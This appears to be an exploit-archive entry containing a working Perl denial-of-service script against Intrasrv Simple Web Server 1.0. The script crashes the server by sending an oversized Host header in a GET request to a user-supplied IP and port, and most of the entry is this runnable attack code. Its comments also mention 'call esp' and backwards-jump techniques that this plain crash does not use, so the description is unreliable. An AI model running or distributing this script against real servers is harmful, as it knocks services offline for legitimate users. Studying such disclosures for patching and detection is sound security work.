id: 39231
date: 01/09/2024
title: Intrasrv Simple Web Server 1.0 Denial Of Service Exploit
author: Fernando Mengali
cves: 

#!/usr/bin/perl

use IO::Socket;

# Exploit Title: Intrasrv Simple Web Server 1.0 - Denial of Service (DoS)
# Discovery by: Fernando Mengali
# Discovery Date: 09 january 2024
# Vendor Homepage: http://www.leighb.com/intrasrv.htm
# Download to demo: http://www.leighb.com/intrasrv.zip
# Download 2 to demo: https://drive.google.com/file/d/1HuUGIGMp_L6viM-j6djGICsyxZg_SJtB/view?usp=sharing
# Notification vendor: No reported
# Tested Version: Intrasrv Simple Web Server 1.0
# Tested on: Window XP Professional - Service Pack 2 and 3 - English
# Vulnerability Type: Denial of Service (DoS)
# Vídeo: https://www.youtube.com/watch?v=9u77LwLgXzU
# Vídeo 2: https://drive.google.com/file/d/1GDVpLx5YfWdhI3ZQcG5P0EWvuR25SEjW/view?usp=sharing

#His technique works fine against Windows XP Professional Service Pack 2 and 3 (English).
#For this exploit I have tried several strategies to increase reliability and performance:
#Jump to a static 'call esp'
#Backwards jump to code a known distance from the stack pointer.
#The server did not properly handle request with large amounts of data via method GET to web server.
#The following request sends a large amount of data to the web server to process across method GET, the server will crash as soon as it is received and processed, causing denial of service conditions.
#Successful exploitation of these issues allows remote attackers to crash the affected server, denying service to legitimate users.

#2. Proof of Concept - PoC

    my $sis="$^O";
    our $cmd;

    if ($sis eq "windows"){
      $cmd="cls";
    } else {
      $cmd="clear";
    }

    system("$cmd");
    
    intro();
    main();
    
    print "[+] Exploiting... \n";

my $buffer1 = "\x41"x4674;

my $buffer2 = "\x41" x 638;

my $buffer = "GET / HTTP/1.1\r\n";
$buffer .= "Host: " . $buffer1 . "\r\n";
$buffer .= "User-Agent: Mozilla/4.0 (Windows XP 5.1)\r\n";
$buffer .= $buffer2;

my $one = IO::Socket::INET->new(
    PeerAddr => $ip,
    PeerPort => $port,
    Proto    => 'tcp',
) or die "Could not connect to $ip: $!\n";

print $one $buffer;
close $one;

    print "[+] Done - Exploited success!!!!!\n\n";
  
   sub intro {
      print "********************************************************\n";
      print "*  Intrasrv Simple Web Server 1.0 - Denied of Service  *\n";
      print "*                                                      *\n";
      print "*            Coded by Fernando Mengali                 *\n";
      print "*                                                      *\n";
      print "*      e-mail: fernando.mengalli\@gmail.com             *\n";
      print "*                                                      *\n";
      print "*******************************************************\n";
  }

  sub main {

our ($ip, $port) = @ARGV;

      unless (defined($ip) && defined($port)) {

        print "       \nUsage: $0 <ip> <port>                 \n";
        exit(-1);

      }
  }

#3. Solution/ How to fix:

# This version product is deprecated

#  0day.today [2024-01-15]  #